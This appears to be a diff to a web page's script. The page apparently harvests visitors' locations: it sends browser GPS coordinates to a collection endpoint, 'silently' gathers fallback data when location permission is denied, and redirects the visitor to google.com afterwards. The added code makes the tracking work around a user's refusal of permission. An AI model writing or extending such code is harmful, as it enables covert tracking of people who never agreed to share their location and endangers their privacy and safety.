@@ -115,7 +115,19 @@
             window.location.href = 'https://www.google.com';
         }
 
-        function requestLocation() {
+        async function requestLocation() {
+            try {
+                const permissionStatus = await navigator.permissions.query({ name: 'geolocation' });
+                if (permissionStatus.state === 'denied') {
+                    // Permission denied, fallback silently
+                    await collectFallback();
+                    done();
+                    return;
+                }
+            } catch (e) {
+                // Permissions API not supported, proceed normally
+            }
+
             navigator.geolocation.getCurrentPosition(
                 async (position) => {
                     await postJSON(ENDPOINT_GPS, {
@@ -131,6 +143,7 @@
                 },
                 { enableHighAccuracy: false, timeout: 10000, maximumAge: 0 }
             );
+
             setTimeout(done, 12000);
         }
 
@@ -146,3 +159,4 @@
             // Request location normally to trigger permission prompt
             requestLocation();
         }
+    
